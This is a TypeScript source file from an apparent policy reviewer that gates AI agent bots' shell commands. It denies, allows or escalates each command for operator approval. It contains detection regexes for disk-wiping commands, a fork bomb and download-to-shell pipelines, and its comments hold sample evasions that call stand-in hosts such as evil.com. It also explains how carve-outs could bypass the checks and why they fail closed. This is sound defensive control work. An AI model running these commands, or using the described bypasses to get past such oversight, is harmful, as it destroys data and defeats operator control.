import { execFileSync } from "node:child_process";
import { existsSync, readFileSync } from "node:fs";
import { dirname, isAbsolute, resolve as resolvePath } from "node:path";

// ── Layer 1: HARD CONSTRAINTS (§6a of .swarm/UNIFIED_REVIEWER.md) ──────────────
// Deterministic, no model call. Loads the authored policy (reviewer-policy.json:
// fleet defaults + per-bot rules) and evaluates each call. Layer 2 (constitution)
// is the model-judged layer that only tightens this floor.

export type Verdict = "allow" | "deny" | "escalate";

export interface Decision {
  verdict: Verdict;
  principle: string;
  reason: string;
}

// Resolved per-bot policy = fleet ∪ per_bot[botKey], flattened for evaluation.
export interface HardPolicy {
  denyReadGlobs: string[];
  denyWriteRoots: string[]; // control-plane (always deny) — fleet-level
  gitignoredWrite: Verdict;
  compoundExec: Verdict; // benign pipes/redirects/&&/|| (substitution handled separately)
  substitutionExec: Verdict; // $( ) ` <( )  — eval vector
  destructiveExec: Verdict;
  // per-bot write scoping
  allowWriteRoots: string[]; // [] = no scoping (fleet-broad)
  escalateWriteRoots: string[];
  denyWriteOutsideAllow: boolean;
  // exec commands matching any of these regexes → DENY outright, no approval path.
  // Distinct from escalateExecRegex on purpose: escalate means "Mike may approve
  // this"; deny means "there is no approval that makes this OK". Added 2026-08-08
  // for House's banking floor — Mike's first rule for the AWS/trading grant was
  // that a bot must never trigger a bank deposit or withdrawal. Expressing that as
  // escalateExtra would have been wrong: escalate routes to an approval prompt, and
  // the whole point is that the action is off the table even if approval is given.
  // Checked BEFORE the escalate patterns so it wins over an overlapping one
  // (house's escalateExtra trade-exec already matches withdraw|transfer).
  denyExecRegex: RegExp[];
  // exec commands matching any of these regexes → escalate under the principle
  // hard:operator-consent-required, which is in NEVER_DOWNGRADE. Use this (not
  // escalateExtra) when the grant is literally "only with Mike's approval": an
  // ordinary escalate is auto-allowed in an unattended run (CLAW-078 reasons that
  // consent was given when the job was authored), which is right for a scheduled
  // git commit and WRONG for discretionary trade execution — an unattended run has
  // no Mike to approve, so it must fail closed instead. Added 2026-08-08 with
  // House's trading grant.
  consentRequiredExecRegex: RegExp[];
  // exec commands matching any of these regexes → escalate (operator-consent)
  escalateExecRegex: RegExp[];
  // SELF-MODIFICATION backstop, kept SEPARATE from escalateExecRegex so it carries
  // its own principle (hard:self-runtime). Two reasons: (1) the audit used to label
  // a `gog` call "operator-consent-action", which was actively misleading during the
  // 2026-07-29 cron incident; (2) unattended runs may auto-downgrade ordinary
  // escalations, and this one must NEVER be downgraded (see NEVER_DOWNGRADE).
  selfRuntimeExecRegex: RegExp[];
}

export const DEFAULT_HARD_POLICY: HardPolicy = {
  denyReadGlobs: ["*.pem", "id_*", "*.key", "*_rsa", "*_ed25519"],
  denyWriteRoots: ["/reach/runes/oasis-x/oasis-claw"],
  gitignoredWrite: "escalate",
  compoundExec: "escalate",
  substitutionExec: "escalate",
  destructiveExec: "deny",
  allowWriteRoots: [],
  escalateWriteRoots: [],
  denyWriteOutsideAllow: false,
  denyExecRegex: [],
  consentRequiredExecRegex: [],
  escalateExecRegex: [],
  selfRuntimeExecRegex: [],
};

// Cron job MUTATION actions on openclaw's native `cron` agent tool
// (src/agents/tools/cron-tool.ts CRON_ACTIONS = status|list|add|update|remove|run|
// runs|wake). add/update/remove change WHAT runs unattended later, so they are the
// authoring-time consent point: gate these, and an unattended run needs no
// per-call approval (CLAW-078). status/list/runs are reads; run/wake only trigger
// an ALREADY-approved job, so both stay allow.
const CRON_MUTATE_ACTIONS = new Set(["add", "update", "remove"]);

// Escalations that must NEVER be auto-downgraded to allow in an unattended run.
// Everything else may be downgraded (an unattended escalate is otherwise a
// guaranteed fail-closed deny — nobody is there to answer). These two are the
// privilege-escalation paths: a cron/webhook turn that can rewrite its own runtime
// (`openclaw config set`) or author new cron jobs would be self-perpetuating, so
// unattended they FAIL CLOSED (deny) instead.
// hard:operator-consent-required is the per-bot consentRequiredExtra principle
// (House's trade execution, 2026-08-08). Same reasoning as the two above: the
// grant is "discretionary trade execution WITH Mike's approval", so a run with no
// Mike must fail closed rather than inherit authoring-time consent.
export const NEVER_DOWNGRADE = new Set(["hard:self-runtime", "hard:cron-mutation", "hard:operator-consent-required"]);

// Escalations that in-conversation operator consent can satisfy (CLAW-079).
// These rules exist to make Mike approve an action; if he asked for it in the same
// run and Layer 2 — which can now see the request — agrees, a second approval is
// friction, not safety. Kept deliberately tiny and author-controlled: this is the
// ONLY way L2 may loosen L1, so nothing belongs here whose whole point is a human
// pause (self-runtime, destructive, control-plane, secret reads).
// NOTE cron-mutation is in BOTH sets, and they never collide: NEVER_DOWNGRADE
// applies to UNATTENDED runs (no operator present at all), CONSENT_SATISFIABLE to
// attended ones where Mike just asked. A cron job editing cron still fails closed.
export const CONSENT_SATISFIABLE = new Set(["hard:cron-mutation"]);

const ALLOW: Decision = { verdict: "allow", principle: "hard:default-allow", reason: "" };

const DESTRUCTIVE = [
  /\brm\s+(-[a-z]*r[a-z]*f|-[a-z]*f[a-z]*r)\b.*\s\/(?:\s|$|\*)/,
  /\brm\s+-[a-z]*[rf][a-z]*\s+(--no-preserve-root|\/)\b/,
  /\bmkfs(\.\w+)?\b/,
  /\bdd\b[^\n]*\bof=\/dev\/(sd|nvme|disk|hd)/,
  /:\s*\(\s*\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:/,
  /\bshred\b|\bwipefs\b/,
  />\s*\/dev\/(sd|nvme|disk|hd)\w*/,
  /\bchmod\s+-R\s+0*\s+\//,
];
// ── Safe scratch-directory rm carve-out (2026-08-24, confirmed live friction) ──
// House's real reviewer-audit.jsonl hard-denied routine "clean up my scratch
// dir before reusing it" work twice: 2026-08-19 `rm -f` of two individually
// named /tmp files before a read-only balance/positions check, and 2026-08-24
// `rm -rf /tmp/<worktree-dir>` before `git worktree add` there to run tests
// against a PR branch. DESTRUCTIVE's second pattern (line below) matches `rm
// -rf` against ANY absolute path, not just a bare `/` — `\/)\b` is satisfied
// by the leading slash of literally any path, since a slash-to-word-char
// transition is always a `\b`. That pattern is paired with --no-preserve-root
// in the same alternation, so its evident intent was "catch a root wipe",
// which DESTRUCTIVE's FIRST pattern already does correctly and independently.
//
// Deliberately narrow: this strips an `rm` invocation ONLY when every target
// is under /tmp or the bot's own persistent scratch dir
// (/home/node/.openclaw/workspace/tmp) — both are container-private space
// nothing but the bot itself ever populates (the rest of the root filesystem
// is read-only). It does NOT touch the DESTRUCTIVE regexes themselves, so
// `rm -rf` of a bare `/` or of any OTHER absolute path (a real project
// directory, /etc, anything outside these two scratch roots) still denies
// exactly as before — this closes the observed false positive without
// widening what DESTRUCTIVE catches everywhere else. If the lookahead below
// finds a non-scratch argument tailing the same invocation (e.g. `rm -rf
// /tmp/x /etc/passwd`), the match fails outright and the ENTIRE original
// command still hits the unmodified DESTRUCTIVE checks — mixing one safe
// target with one unsafe one gets no benefit from this carve-out.
const SAFE_SCRATCH_RM =
  /\brm\s+-[a-z]+((?:\s+(?:\/tmp|\/home\/node\/\.openclaw\/workspace\/tmp)(?:\/[^\s;&|<>$`()]*)?)+)(?=\s*(?:;|&&|\|\||\||$))/gi;
function stripSafeScratchRm(cmd: string): string {
  return cmd.replace(SAFE_SCRATCH_RM, "");
}

// Download/decode → shell execution (obfuscated RCE): fetched or decoded content
// piped/chained INTO a shell interpreter. Hard-deny even on a reviewer-gated bot
// (a legit install is done in inspectable steps, or by Mike).
const DOWNLOAD_EXEC = /(?:\||&&|;)\s*(?:sudo\s+)?(?:sh|bash|zsh|dash|ksh)\b|(?:^|\s|;|&|\|)eval\s+\S/i;
// Command / process substitution = an eval vector that evades static inspection —
// route to a human even on a reviewer-gated bot.
const SUBSTITUTION = /\$\(|`|<\(/;
// NARROW carve-out (2026-07-30, Nimbus sheets friction): `$(cat /tmp/<file>)`
// reading back a scratch file the bot just staged with the `write` tool (already
// reviewed), e.g. `gog sheets update ... --values-json "$(cat /tmp/reno.json)"`.
// `cat` cannot execute the file's bytes, only surface them as a literal argument,
// and /tmp is container-private scratch space that nothing but the bot itself
// ever populates (read-only rootfs elsewhere) — so this exact shape carries none
// of the eval-vector risk SUBSTITUTION exists to catch. Any OTHER command inside
// $(), any nested $()/backtick, or a path outside /tmp still hits the escalate
// below untouched.
const SAFE_TMP_CAT_SUBSTITUTION = /\$\(\s*cat\s+\/tmp\/[^\s$`()|;&<>]+\s*\)/g;
function hasOnlySafeTmpCatSubstitution(cmd: string): boolean {
  return !SUBSTITUTION.test(cmd.replace(SAFE_TMP_CAT_SUBSTITUTION, ""));
}

// ── Safe pure-computation substitution carve-out (CLAW-098, 2026-08-18) ──────
// A SECOND, separate narrow carve-out alongside SAFE_TMP_CAT_SUBSTITUTION
// above: $(date ...), $(pwd), and version-probe calls used for pure,
// side-effect-free computation -- e.g. `START=$(( $(date +%s) - 172800 ))` to
// compute a time-window for an otherwise read-only aws/log query, or
// `echo "Node: $(node --version)"` in a health-check. Confirmed live friction
// (House's real reviewer-audit.jsonl): these commands have no side effect and
// take no argument that could carry untrusted content, but SUBSTITUTION
// (an eval-vector check) cannot see that -- it only sees `$(`.
//
// SAFE_SUBSTITUTION_COMMANDS is deliberately an ENUMERATED allowlist, same
// discipline as GIT_READ_ONLY_SUBCOMMANDS / AWS_READ_ONLY_OPERATION above: it
// grows only by a deliberate addition of a command that is PROVABLY incapable
// of executing untrusted input or leaking secrets. `date`'s -f/--file and
// -r/--reference (read a file's content/mtime) and -s/--set (mutates the
// system clock) are deliberately excluded -- only display/format flags and a
// literal -d/--date STRING (itself still checked for `$`()|;&<>` below) are
// admitted. `curl`, `cat` (outside the existing /tmp carve-out), `eval`, and
// anything else are NOT on this list and never will be without a provable
// side-effect-free argument shape -- when in doubt, do not add.
const SAFE_SUBSTITUTION_EXACT = new Set([
  "date",
  "pwd", "pwd -L", "pwd -P",
  "node --version", "node -v",
  "python3 --version", "python3 -V",
  "python --version", "python -V",
]);

// date's argument shape varies per call (a format string or -d value), so it
// needs a real check rather than an exact-string match. Fails CLOSED: any
// token this loop does not explicitly recognize rejects the WHOLE invocation
// (including a stray token produced by this function's own naive whitespace
// split failing to respect an inner quote around a multi-word -d value --
// that split imprecision can only ever cause an extra rejection, never a
// silent acceptance, since an unrecognized token always falls through to the
// final `return false`).
function isSafeDateInvocation(argv: string): boolean {
  const tokens = argv.trim().split(/\s+/);
  if (tokens[0] !== "date") return false;
  const DANGEROUS_CHAR = /[$`()|;&<>]/;
  let i = 1;
  while (i < tokens.length) {
    const t = tokens[i];
    if (t === "-u" || t === "--utc") { i += 1; continue; }
    if (/^\+[^\s$`()|;&<>]*$/.test(t)) { i += 1; continue; }
    if (t === "-d" || t === "--date") {
      const val = tokens[i + 1];
      if (val === undefined || DANGEROUS_CHAR.test(val)) return false;
      i += 2;
      continue;
    }
    if (/^--date=[^\s$`()|;&<>]*$/.test(t)) { i += 1; continue; }
    return false; // any other flag (-f/--file, -r/--reference, -s/--set, unknown) -> unsafe
  }
  return true;
}

function isSafeSubstitutionContent(inner: string): boolean {
  const trimmed = inner.trim().replace(/\s+/g, " ");
  if (SAFE_SUBSTITUTION_EXACT.has(trimmed)) return true;
  if (trimmed === "date" || trimmed.startsWith("date ")) return isSafeDateInvocation(trimmed);
  return false;
}

type SubSpan = { start: number; end: number; kind: "$((" | "$(" | "`" };

// Balanced-delimiter scanner for TOP-LEVEL substitution spans (never
// recurses into an already-found span here; $((...))'s own nested $(...)
// content is handled separately in stripSafePureComputationSpans below,
// which re-invokes this same scanner on just that span's inner text).
function scanSubstitutionSpans(s: string): SubSpan[] {
  const spans: SubSpan[] = [];
  let i = 0;
  while (i < s.length) {
    if (s[i] === "$" && s[i + 1] === "(" && s[i + 2] === "(") {
      let depth = 2; // "$((" opens two levels
      let j = i + 3;
      while (j < s.length && depth > 0) {
        if (s[j] === "(") depth += 1;
        else if (s[j] === ")") depth -= 1;
        j += 1;
      }
      spans.push({ start: i, end: j, kind: "$((" });
      i = j;
      continue;
    }
    if (s[i] === "$" && s[i + 1] === "(") {
      let depth = 1;
      let j = i + 2;
      while (j < s.length && depth > 0) {
        if (s[j] === "(") depth += 1;
        else if (s[j] === ")") depth -= 1;
        j += 1;
      }
      spans.push({ start: i, end: j, kind: "$(" });
      i = j;
      continue;
    }
    if (s[i] === "`") {
      let j = i + 1;
      while (j < s.length && s[j] !== "`") j += 1;
      j = Math.min(j + 1, s.length);
      spans.push({ start: i, end: j, kind: "`" });
      i = j;
      continue;
    }
    i += 1;
  }
  return spans;
}

// Tokenizes arithmetic-expansion content and rejects anything that is not
// PURE arithmetic on numbers/identifiers/operators. This specifically closes
// the disguised-subshell case: bash falls back to running `$(( ... ))`'s
// content as a real command substitution when it fails to parse as
// arithmetic, and `$(( (echo pwned) ))` is exactly that failure shape --
// "echo" and "pwned" are two adjacent operand tokens with no operator between
// them, which valid arithmetic never produces. `START*1000` and
// `START - 172800` both parse as alternating operand/operator tokens and are
// correctly accepted; `(echo pwned)` is correctly rejected.
// \s+ is matched as its own token deliberately, NOT stripped before
// tokenizing: stripping whitespace first would merge two whitespace-
// separated identifiers into one bigger identifier (turning "echo pwned"
// into the single token "echopwned"), destroying the exact boundary the
// adjacency check below needs to see. Whitespace tokens are skipped (never
// count as an operator) when checking adjacency, matching bash's own
// grammar: "1 2" and "echo pwned" are equally invalid arithmetic, whitespace
// is not a substitute for an operator.
const ARITH_TOKEN = /\s+|\d+|[A-Za-z_]\w*|\*\*|<<|>>|<=|>=|==|!=|&&|\|\||[-+*/%&|^~!<>?:,=()]/g;
function isPureArithmetic(inner: string): boolean {
  const tokens = inner.match(ARITH_TOKEN) ?? [];
  if (tokens.join("").length !== inner.length) return false; // a char outside the token set
  let prevWasOperand = false;
  for (const t of tokens) {
    if (/^\s+$/.test(t)) continue; // whitespace never resets or satisfies adjacency
    const isOperand = /^(\d+|[A-Za-z_]\w*)$/.test(t);
    if (isOperand && prevWasOperand) return false; // adjacent operands, no operator -> not real arithmetic
    prevWasOperand = isOperand;
  }
  return true;
}

// Strips every substitution span that is provably safe pure computation,
// leaving everything else (including a span this function cannot prove safe)
// untouched for SUBSTITUTION to still catch. A $((...)) span is stripped only
// if ALL its nested $(...)/backtick spans are individually safe AND what
// remains after removing them is pure arithmetic -- one unsafe nested span
// poisons the whole arithmetic expression, it is never partially stripped.
// `<(` process substitution is NEVER stripped by this function -- it never
// appears as a $(/backtick/$(( span, so scanSubstitutionSpans simply never
// finds it, and it always continues on to the SUBSTITUTION check unchanged.
function stripSafePureComputationSpans(s: string): string {
  const spans = scanSubstitutionSpans(s);
  let result = "";
  let last = 0;
  for (const span of spans) {
    const raw = s.slice(span.start, span.end);
    let safe = false;
    if (span.kind === "$(" || span.kind === "`") {
      const inner = span.kind === "$(" ? raw.slice(2, -1) : raw.slice(1, -1);
      safe = isSafeSubstitutionContent(inner);
    } else {
      const inner = raw.slice(3, -2);
      const nestedSpans = scanSubstitutionSpans(inner).filter((sp) => sp.kind !== "$((");
      let withoutSafeNested = "";
      let innerLast = 0;
      let allNestedSafe = true;
      for (const nsp of nestedSpans) {
        const nraw = inner.slice(nsp.start, nsp.end);
        const ninner = nsp.kind === "$(" ? nraw.slice(2, -1) : nraw.slice(1, -1);
        if (!isSafeSubstitutionContent(ninner)) { allNestedSafe = false; break; }
        withoutSafeNested += inner.slice(innerLast, nsp.start);
        innerLast = nsp.end;
      }
      if (allNestedSafe) {
        withoutSafeNested += inner.slice(innerLast);
        safe = isPureArithmetic(withoutSafeNested);
      }
    }
    result += s.slice(last, span.start);
    if (!safe) result += raw;
    last = span.end;
  }
  result += s.slice(last);
  return result;
}

function hasOnlySafeSubstitution(cmd: string): boolean {
  const strippedTmp = cmd.replace(SAFE_TMP_CAT_SUBSTITUTION, "");
  return !SUBSTITUTION.test(stripSafePureComputationSpans(strippedTmp));
}
// Benign shell composition: pipes, sequencing, output redirects. On a reviewer-
// gated bot (Mike, 2026-07-27) these RUN — destructive / download-exec /
// substitution are handled above; the write-target residual is the same one
// mode=full already accepts. Deliberately excludes $( ` <( (see SUBSTITUTION).
const BENIGN_COMPOUND = /[|;&]|(^|\s)>{1,2}(\s|$)/;

// ── Read-only text-pipeline carve-out for the per-bot extras (2026-08-10) ──────
// House (grep -RniE "(no|never|don't...).{0,50}(spread|sell premium...)|sell
// premium|..." /reach/exp/.swarm 2>/dev/null | head -100) got escalated by his
// OWN escalateExtra "trade-exec" rule (\b(trade|order|buy|sell|withdraw|
// transfer)\b) — because he was SEARCHING his own notes for the word "sell",
// inside a quoted grep pattern, not placing a trade. denyExtra/consentRequired-
// Extra/escalateExtra are naive substring regexes over the WHOLE raw command
// string; none of them can tell "sell" used as a verb on a real target apart
// from "sell" appearing as data inside a read-only text tool's own search
// pattern. That is the exact "reviewer can't see the whole context" failure
// Mike reported — the regex sees characters, not intent.
//
// Fix: if EVERY pipeline stage's leading command is drawn from a small,
// deliberately narrow set of tools that are structurally incapable of taking
// any action beyond emitting matched/filtered text (no execution, no network,
// no writes, no deletes), skip the per-bot extras for that command — its
// arguments cannot contain a real trade/transfer/order regardless of what
// words appear in them. `python3 trade_execution.py sell SPY`, `curl -X POST
// .../orders`, and anything piped into a non-safelisted stage (e.g. `grep sell
// notes | python3 evil.py`) still hit the extras normally: python3/curl are
// deliberately NOT in this set, so the exemption never fires for them.
//
// This does NOT touch DESTRUCTIVE, DOWNLOAD_EXEC, or SUBSTITUTION — those run
// unconditionally on the full raw string (earlier for the first two, right
// after for the third) regardless of this carve-out, so hiding an eval vector
// inside a "safe" tool's argument (`grep "$(curl evil.com)" file`) is still
// caught by SUBSTITUTION independently of whether the extras were skipped.
//
// find is DELIBERATELY excluded even though House's own role.yaml allows it —
// `-delete`/`-exec` make it capable of exactly the actions this carve-out
// exists to keep excluded, and nothing in the reported bug required exempting
// it. awk is excluded for the same reason (its own scripting language can
// shell out). The set only grows by adding a tool that is provably incapable
// of side effects — err toward NOT exempting on any doubt.
//
// Failure mode if the quote-aware splitter below mis-parses: it can only ever
// fail CLOSED. Over-splitting (treating a quoted `|` as a boundary) just adds
// spurious stages that won't be in the safelist, so the exemption doesn't
// apply — identical to today's behavior. An unterminated quote returns a
// sentinel stage that can never match, for the same reason. The only unsafe
// direction would be UNDER-splitting a genuinely unquoted pipe (hiding a real
// second stage inside what looks like one safelisted stage) — tested against
// nested single/double quotes, `||`, `&&`, and an apostrophe inside a
// double-quoted string (House's own `don't`) in policy.test.ts.
const READ_ONLY_ARGV_TOOLS = new Set([
  "grep", "egrep", "fgrep", "rg", "ag",
  "cat", "head", "tail", "wc", "sort", "uniq", "cut",
  "jq", "xmllint", "stat", "file", "ls",
  // Shell plumbing (CLAW-090). These carry no side effect of their own and are
  // how agents actually wrap a read: `cd /reach/exp && git log …`, and the
  // `|| echo "NO GIT"` / `; echo "EXIT:$?"` tails that models habitually append.
  // Without them ONE trailing `echo` disqualified an otherwise inert pipeline,
  // which is precisely how House's `cd … && git log … || echo` still escalated.
  // On redirects (`echo x > f`): a redirect is not a new capability here — it is
  // already reachable through safelisted `cat`, it does not split into its own
  // stage, and this carve-out skips ONLY the three per-bot word regexes
  // (banking/trade). DESTRUCTIVE, DOWNLOAD_EXEC and SUBSTITUTION are unaffected.
  "cd", "echo", "printf", "pwd", "dirname", "basename", "true", "false",
]);

// ── Read-only git (CLAW-090) ────────────────────────────────────────────────
// `git` is deliberately NOT in READ_ONLY_ARGV_TOOLS: the binary is a
// multiplexer, so the SUBCOMMAND decides. `git diff` is inert; `git push` is
// not. Judging the leading token alone would exempt both.
//
// These subcommands have NO mutating form at all — there is no flag that turns
// `git status` or `git rev-parse` into a write. Anything with a mutating mode
// (checkout, reset, tag, stash, config, fetch, submodule, …) is absent on
// purpose; the set only grows by adding a subcommand that is provably
// incapable of changing the repo, the index, or a remote.
const GIT_READ_ONLY_SUBCOMMANDS = new Set([
  "status", "log", "show", "diff", "diff-tree", "diff-index", "grep",
  "blame", "annotate", "rev-parse", "rev-list", "describe", "shortlog",
  "whatchanged", "ls-files", "ls-tree", "cat-file", "name-rev",
  "merge-base", "check-ignore", "check-attr", "show-ref", "for-each-ref",
  "count-objects", "verify-commit", "verify-tag", "version",
]);

// `branch` and `remote` are the two subcommands Mike's bots actually use for
// recon that DO have mutating forms — and not only behind a flag: a bare
// `git branch <name>` creates one and `git remote add` adds one. So they are
// inert only in a pure listing form, where every token after the subcommand is
// one of these value-less display flags. Any positional argument disqualifies
// the stage, which is what keeps `git branch feature-x` out.
const GIT_LISTING_ONLY_FLAGS: Record<string, Set<string>> = {
  branch: new Set(["--show-current", "--list", "-l", "-a", "--all", "-r", "--remotes", "-v", "-vv", "--verbose"]),
  remote: new Set(["-v", "--verbose"]),
};

// git global options that turn ANY subcommand into arbitrary execution and so
// disqualify the stage outright, however read-only the subcommand looks:
//   git -c core.pager='sh -c evil' log      → runs evil
//   git -c alias.x='!evil' x                → runs evil
//   --exec-path / --upload-pack / --receive-pack  → relocate the helper binary
//   --output=<file>                         → `git diff --output` WRITES a file
// Note the sibling protection: an env-var prefix (`GIT_EXTERNAL_DIFF=evil git
// diff`) makes the stage's leading token `GIT_EXTERNAL_DIFF=evil`, not `git`,
// so it fails the leading-token check and is never inert.
const GIT_EXEC_VECTOR = /(^|\s)(-c|--config-env|--exec-path|--upload-pack|--receive-pack|--output)(=|\s|$)/;

// git global options that legitimately precede a subcommand and are harmless.
// The two-token forms consume their value; House's real commands use `-C`.
const GIT_GLOBAL_WITH_VALUE = new Set(["-C", "--git-dir", "--work-tree", "--namespace"]);
const GIT_GLOBAL_FLAGS = new Set(["--no-pager", "-P", "--paginate", "--bare", "--literal-pathspecs", "--no-replace-objects"]);

function isInertGitStage(stage: string): boolean {
  const tokens = stage.trim().split(/\s+/).filter((t) => t.length > 0);
  if (tokens.length === 0) return false;
  if ((tokens[0].split("/").pop() ?? "").toLowerCase() !== "git") return false;
  if (GIT_EXEC_VECTOR.test(stage)) return false;
  let i = 1;
  while (i < tokens.length) {
    const t = tokens[i];
    if (GIT_GLOBAL_WITH_VALUE.has(t)) { i += 2; continue; }
    if (GIT_GLOBAL_FLAGS.has(t)) { i += 1; continue; }
    if (/^--(git-dir|work-tree|namespace)=/.test(t)) { i += 1; continue; }
    break;
  }
  const sub = (tokens[i] ?? "").toLowerCase();
  if (!sub) return false;
  if (GIT_READ_ONLY_SUBCOMMANDS.has(sub)) return true;
  const listingFlags = GIT_LISTING_ONLY_FLAGS[sub];
  if (!listingFlags) return false;
  return tokens.slice(i + 1).every((t) => listingFlags.has(t));
}

// ── Read-only openclaw self-runtime (CLAW-104, 2026-08-20) ────────────────────
// `openclaw` is the same multiplexer shape as `git` above: the BINARY name says
// nothing about mutation, the SUBCOMMAND does. `openclaw config set` rewrites
// the live runtime config; `openclaw config get` only prints it.
//
// hard:self-runtime was fully categorical — EVERY `openclaw …` escalated,
// including pure diagnostics. A 2026-08-20 field friction report measured that
// cost directly: `openclaw browser status`, `openclaw --help` and
// `openclaw config get browser` each needed a slash-command approval, and
// self-runtime is in NEVER_DOWNGRADE, so an unattended run fail-closed to deny
// on a call that only reads. The operator's rule (2026-08-20): a bot driving
// its own runtime should default to ALLOWED while no privileged or sensitive
// data leaves the sandbox, and mutation still needs approval.
//
// This carve-out is deliberately an ALLOWLIST of subcommands, never a denylist
// of dangerous ones: an openclaw version that adds a new mutating subcommand
// must fail CLOSED (escalate) rather than slip through because nobody added it
// to a block list. Anything not named here keeps today's escalate exactly.
const OPENCLAW_READ_ONLY_SUBCOMMANDS = new Set([
  "status",
  "list",
  "ls",
  "tabs",
  "show",
  "version",
  "help",
]);
// Subcommands that are read-only ONLY in their `get` form — `config set`,
// `models auth`, and friends all mutate.
const OPENCLAW_GET_ONLY_NAMESPACES = new Set(["config"]);
// Flags that are read-only no matter which subcommand carries them.
const OPENCLAW_READ_ONLY_FLAGS = new Set(["--help", "-h", "--version", "-v"]);

function isInertOpenclawStage(stage: string): boolean {
  const tokens = stage.trim().split(/\s+/).filter((t) => t.length > 0);
  if (tokens.length === 0) return false;
  if ((tokens[0].split("/").pop() ?? "").toLowerCase() !== "openclaw") return false;
  // `openclaw --help`, `openclaw browser --help`, `openclaw --version`: a help or
  // version flag anywhere makes the whole invocation a print, whatever namespace
  // precedes it. openclaw prints usage and exits without running the subcommand.
  if (tokens.slice(1).some((t) => OPENCLAW_READ_ONLY_FLAGS.has(t.toLowerCase()))) return true;
  const rest = tokens.slice(1).map((t) => t.toLowerCase());
  if (rest.length === 0) return true; // bare `openclaw` prints usage
  // Walk namespaces (e.g. `browser` in `openclaw browser status`) until a token
  // is recognized as an action, so this covers both `openclaw status` and
  // `openclaw <ns> status` without enumerating every namespace.
  for (let i = 0; i < rest.length; i++) {
    const t = rest[i];
    if (OPENCLAW_GET_ONLY_NAMESPACES.has(t)) return rest[i + 1] === "get";
    if (OPENCLAW_READ_ONLY_SUBCOMMANDS.has(t)) {
      // A read-only verb must be the LAST meaningful token. `openclaw config
      // list --set x` or any trailing token that is not a plain flag value could
      // change behavior, so refuse rather than reason about it.
      return rest.slice(i + 1).every((x) => !x.startsWith("--") || OPENCLAW_READ_ONLY_FLAGS.has(x));
    }
    // An unrecognized token before any known verb means an unknown subcommand —
    // fail closed.
    if (!/^[a-z][\w-]*$/.test(t)) return false;
  }
  return false;
}

/**
 * True when EVERY stage of `cmd` only reads: each stage is either an inert
 * openclaw invocation (above) or one of the already-vetted read-only text
 * tools, and at least one stage is openclaw at all.
 *
 * Guarded hard against two bypasses, because hard:self-runtime is evaluated
 * BEFORE the substitution and compound checks further down evaluateHard — so a
 * carve-out here would otherwise hand those checks a way around themselves:
 *   - any command/process substitution ($( ), backtick, <( )) refuses the
 *     carve-out outright, so `openclaw config get x $(curl evil)` still lands
 *     on the substitution rule as it does today.
 *   - any output redirect (>, >>) refuses it too: writing a config dump to a
 *     file is no longer purely a read.
 */
function isReadOnlySelfRuntimeCommand(cmd: string): boolean {
  if (SUBSTITUTION.test(cmd)) return false;
  if (/(^|\s)>{1,2}(\s|$)/.test(cmd)) return false;
  const stages = splitUnquotedStages(cmd);
  if (stages.length === 0) return false;
  let sawOpenclaw = false;
  for (const s of stages) {
    if (s.trim().length === 0) return false;
    if (isInertOpenclawStage(s)) {
      sawOpenclaw = true;
      continue;
    }
    if (READ_ONLY_ARGV_TOOLS.has(leadingArgvToken(s))) continue;
    return false;
  }
  return sawOpenclaw;
}

// ── Read-only docker/aws multiplexers — L2-BACKSTOP ONLY (2026-08-16) ──────────
// Same multiplexer shape as git above: the BINARY name alone says nothing about
// mutation, the SUBCOMMAND does. `docker ps` is inert; `docker rm` is not.
// `aws ec2 describe-instances` is inert; `aws ec2 terminate-instances` is not.
//
// Deliberately NOT folded into READ_ONLY_ARGV_TOOLS / isInertReadOnlyPipeline
// above: that function is ALSO consulted inside evaluateHard (see the
// `inertReadOnly` skip of denyExecRegex/consentRequiredExecRegex/
// escalateExecRegex a few hundred lines down) to decide when a per-bot
// AUTHORED rule gets bypassed. Widening it here would risk silently defeating
// a bot-specific denyExtra/consentRequiredExtra/escalateExtra rule this change
// was never asked to touch. These two helpers feed ONLY
// isInertReadOnlyPipelineForL2Backstop below, which reviewer.ts's INERT-READ
// BACKSTOP uses — and that backstop only ever fires when Layer 1 has ALREADY
// returned "allow" for its own, unmodified reasons, so a per-bot rule that
// currently denies or escalates a docker/aws call keeps doing so untouched:
// this can only ever suppress a REDUNDANT Layer 2 escalation layered on top of
// an allow Layer 1 already gave.
//
// docker: exactly the three subcommands Mike asked to hard-allow — ps, logs,
// inspect. Enumerated, not pattern-matched, so the set only grows by a
// deliberate addition, same posture as GIT_READ_ONLY_SUBCOMMANDS above.
// FLAGGED ASSUMPTION: `docker logs` / `docker inspect` can surface secrets a
// container was started with (env vars baked in via `-e`, mounted config) —
// a DIFFERENT risk than "this mutates something," and Layer 1 has no
// docker-specific equivalent of denyReadGlobs today. Confirm this residual is
// acceptable before shipping, or narrow the set further if not.
const DOCKER_READ_ONLY_SUBCOMMANDS = new Set(["ps", "logs", "inspect"]);

function isInertDockerStage(stage: string): boolean {
  const tokens = stage.trim().split(/\s+/).filter((t) => t.length > 0);
  if (tokens.length < 2) return false;
  if ((tokens[0].split("/").pop() ?? "").toLowerCase() !== "docker") return false;
  // A global flag ahead of the subcommand (`docker -H tcp://evil ps`) can
  // redirect the whole call to a different daemon — disqualify outright, same
  // reasoning as GIT_EXEC_VECTOR above.
  if (tokens[1].startsWith("-")) return false;
  return DOCKER_READ_ONLY_SUBCOMMANDS.has(tokens[1].toLowerCase());
}

// aws: ONLY the `describe-*` and `list-*` operation-name shapes — a DELIBERATE
// NARROWING from Mike's literal "describe/list/get" phrasing. `aws ssm
// get-parameter --with-decryption` and `aws secretsmanager get-secret-value`
// are both spelled "get" and both return LIVE CREDENTIALS in plaintext; no
// `describe-*` or `list-*` operation on any AWS service returns decrypted
// secret material, only resource metadata. Hard-allowing "get" as a class
// would recreate, for AWS credentials, exactly the override-a-real-escalation
// failure mode this fix exists to close — so "get" stays fully subject to
// ordinary Layer 2 judgment, unchanged.
const AWS_READ_ONLY_OPERATION = /^(describe|list)-[a-z0-9][a-z0-9-]*$/;

function isInertAwsStage(stage: string): boolean {
  const tokens = stage.trim().split(/\s+/).filter((t) => t.length > 0);
  if (tokens.length < 3) return false;
  if ((tokens[0].split("/").pop() ?? "").toLowerCase() !== "aws") return false;
  // A global flag ahead of the service token (`aws --endpoint-url https://evil
  // s3api list-buckets`) can redirect the call — disqualify.
  if (tokens[1].startsWith("-")) return false;
  return AWS_READ_ONLY_OPERATION.test(tokens[2].toLowerCase());
}

// ── Read-only NATIVE (non-exec) tool calls — L2-BACKSTOP ONLY (2026-08-16) ─────
// The exec-pipeline checks above only cover commands routed through a shell. A
